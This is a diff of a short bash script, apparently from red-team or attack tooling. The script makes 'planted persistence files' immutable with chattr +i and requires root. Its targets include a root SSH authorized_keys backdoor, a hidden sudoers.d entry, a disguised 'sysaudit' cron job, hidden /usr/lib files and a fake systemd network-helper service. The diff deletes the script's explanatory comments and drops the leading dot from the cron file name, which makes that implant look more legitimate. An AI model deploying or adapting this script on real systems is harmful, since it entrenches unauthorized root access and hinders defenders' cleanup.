@@ -1,7 +1,4 @@
 #!/usr/bin/env bash
-# Apply or remove chattr +i on all planted persistence files.
-# Run after all other deploy scripts to lock everything down.
-# Required first step for blue team cleanup: defender-cli anti-persistence --immutable
 set -euo pipefail
 [[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }
 
@@ -11,7 +8,7 @@ SAFE_USER="${SHADOW_USER//./_}"
 FILES=(
   "/root/.ssh/authorized_keys"
   "/etc/sudoers.d/.${SAFE_USER}"
-  "/etc/cron.d/.sysaudit"
+  "/etc/cron.d/sysaudit"
   "/usr/lib/.pam_auth"
   "/usr/lib/systemd/.net-helper"
   "/etc/systemd/system/systemd-network-helper.service"
